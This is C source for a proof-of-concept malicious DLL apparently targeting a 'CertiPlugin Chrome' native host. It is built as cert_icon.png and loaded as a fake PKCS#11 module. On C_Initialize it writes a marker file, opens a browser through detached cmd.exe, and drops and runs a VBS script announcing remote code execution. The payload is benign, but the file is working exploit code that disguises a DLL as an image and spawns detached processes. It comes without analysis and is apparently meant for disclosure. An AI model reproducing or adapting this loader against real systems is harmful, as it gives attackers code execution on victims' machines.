/*
 * CertiPlugin Chrome RCE — demonstration DLL.
 * Loaded as cert_icon.png via the LoadLibraryW chain.
 *
 * Build (32-bit MinGW-w64):
 *   i686-w64-mingw32-gcc -shared -o cert_icon.png marker.c \
 *       -static-libgcc -Wl,--enable-stdcall-fixup \
 *       -lshell32 -luser32
 *
 * On load it:
 *   1. Appends a line to %USERPROFILE%\Desktop\dllmain_marker.txt
 *   2. Spawns msedge.exe --new-window <rickroll>
 *   3. Spawns wscript.exe %TEMP%\certi_pwn.vbs (a MsgBox popup)
 *   4. Stubs PKCS#11 entry points so the host returns cleanly
 *      (0 slots reported, no exception)
 *
 * Children are spawned DETACHED so they outlive CertisignerHost.exe,
 * which exits quickly after C_Finalize.
 */
#include <windows.h>
#include <stdio.h>
#include <shellapi.h>

#define CKR_OK                     0x00000000UL
#define CKR_FUNCTION_NOT_SUPPORTED 0x00000054UL

typedef unsigned long CK_RV;
typedef unsigned long CK_ULONG;
typedef CK_ULONG *CK_ULONG_PTR;
typedef unsigned char CK_BBOOL;
typedef void *CK_VOID_PTR;
typedef CK_ULONG CK_SLOT_ID;
typedef CK_SLOT_ID *CK_SLOT_ID_PTR;

static void log_line(const char *what) {
    char path[MAX_PATH];
    if (!GetEnvironmentVariableA("USERPROFILE", path, MAX_PATH)) return;
    strncat(path, "\\Desktop\\dllmain_marker.txt", MAX_PATH - strlen(path) - 1);
    FILE *f = fopen(path, "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d.%03d] %s pid=%lu\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        what, GetCurrentProcessId());
    fclose(f);
}

static BOOL spawn_detached(const wchar_t *cmdline_template) {
    WCHAR buf[2048];
    lstrcpynW(buf, cmdline_template, 2048);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    BOOL ok = CreateProcessW(NULL, buf, NULL, NULL, FALSE,
        DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok;
}

static void write_vbs(char *out_path, size_t out_sz) {
    GetTempPathA((DWORD)out_sz, out_path);
    strncat(out_path, "certi_pwn.vbs", out_sz - strlen(out_path) - 1);
    FILE *f = fopen(out_path, "w");
    if (!f) return;
    fputs(
        "MsgBox \"You were RCE'd by a .one webpage via CertiPlugin Chrome.\""
        " & vbCrLf & vbCrLf &"
        " \"This MessageBox is being shown by wscript.exe, spawned from CertisignerHost.exe load chain.\""
        " & vbCrLf &"
        " \"No prompts, no flagged downloads.\","
        " vbExclamation + vbSystemModal,"
        " \"CertiPlugin RCE PoC\"\n",
        f);
    fclose(f);
}

static void spawn_payload(void) {
    spawn_detached(
        L"cmd.exe /c start \"\" "
        L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" "
        L"--new-window https://www.youtube.com/watch?v=dQw4w9WgXcQ "
        L"|| start \"\" "
        L"\"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\" "
        L"--new-window https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    );
    log_line("edge spawned");

    char vbs[MAX_PATH] = {0};
    write_vbs(vbs, sizeof(vbs));
    WCHAR vbs_w[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, vbs, -1, vbs_w, MAX_PATH);
    WCHAR cmd[1024];
    _snwprintf(cmd, 1024, L"wscript.exe \"%ls\"", vbs_w);
    spawn_detached(cmd);
    log_line("wscript MsgBox spawned");
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) log_line("DllMain DLL_PROCESS_ATTACH");
    return TRUE;
}

__declspec(dllexport) CK_RV __cdecl C_Initialize(CK_VOID_PTR p) {
    log_line("C_Initialize");
    spawn_payload();
    return CKR_OK;
}

__declspec(dllexport) CK_RV __cdecl C_Finalize(CK_VOID_PTR p) {
    return CKR_OK;
}

__declspec(dllexport) CK_RV __cdecl C_GetInfo(CK_VOID_PTR p) {
    if (p) memset(p, 0, 80);
    return CKR_OK;
}

__declspec(dllexport) CK_RV __cdecl C_GetSlotList(CK_BBOOL tokenPresent,
        CK_SLOT_ID_PTR pSlotList, CK_ULONG_PTR pulCount) {
    if (pulCount) *pulCount = 0;
    return CKR_OK;
}

#define STUB(name) \
    __declspec(dllexport) CK_RV __cdecl name(void *a, void *b, void *c, void *d, void *e, void *f) { \
        return CKR_FUNCTION_NOT_SUPPORTED; \
    }

STUB(C_CloseSession)
STUB(C_CreateObject)
STUB(C_Decrypt)
STUB(C_DecryptInit)
STUB(C_DestroyObject)
STUB(C_Encrypt)
STUB(C_EncryptInit)
STUB(C_FindObjects)
STUB(C_FindObjectsFinal)
STUB(C_FindObjectsInit)
STUB(C_GenerateKeyPair)
STUB(C_GetAttributeValue)
STUB(C_GetMechanismInfo)
STUB(C_GetMechanismList)
STUB(C_GetTokenInfo)
STUB(C_Login)
STUB(C_Logout)
STUB(C_OpenSession)
STUB(C_SetAttributeValue)
STUB(C_Sign)
STUB(C_SignInit)
